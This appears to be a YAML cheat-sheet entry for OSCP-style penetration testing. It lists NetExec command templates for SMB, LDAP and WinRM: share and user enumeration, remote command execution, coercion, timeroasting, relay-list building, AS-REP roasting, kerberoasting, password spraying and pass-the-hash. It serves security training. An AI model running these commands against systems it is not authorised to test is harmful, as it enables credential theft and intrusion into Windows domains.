---
variants:
  - label: smb
    command: |
      nxc smb $IP -u '$USER' -p '$PASSWORD' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
      nxc smb $IP -u 'a' -p ''
      nxc smb $IP -u '$USER' -p '$PASSWORD' -X 'whoami'
      nxc smb $IP -u $USER -p $PASSWORD -M coerce_plus
      nxc smb $IP -M timeroast
      nxc smb smb_hosts.txt --gen-relay-list relay_targets.txt
  - label: ldap
    command: |
      nxc ldap $IP -u '$USER' -p '$PASSWORD' --trusted-for-delegation --password-not-required --admin-count --users --groups
      nxc ldap $IP -u users.txt -p '' --asreproast hashes.asrep
      nxc ldap $IP -u '$USER' -p '$PASSWORD' --kerberoasting hashes.kerberoast
  - label: winrm
    command: |
      nxc winrm $IP -u usernames.txt -p $PASSWORD -d $DOMAIN --local-auth
      nxc winrm $IP -u $USER -H $HASH
description: Enumerate or attack a host with NetExec, by protocol.
os: [Linux]
category: [oscp, cli]
have: [hash]
service: [SMB, LDAP, WinRM]
phase: [Enumeration, Exploitation]
references:
  - https://github.com/Pennyw0rth/NetExec
---
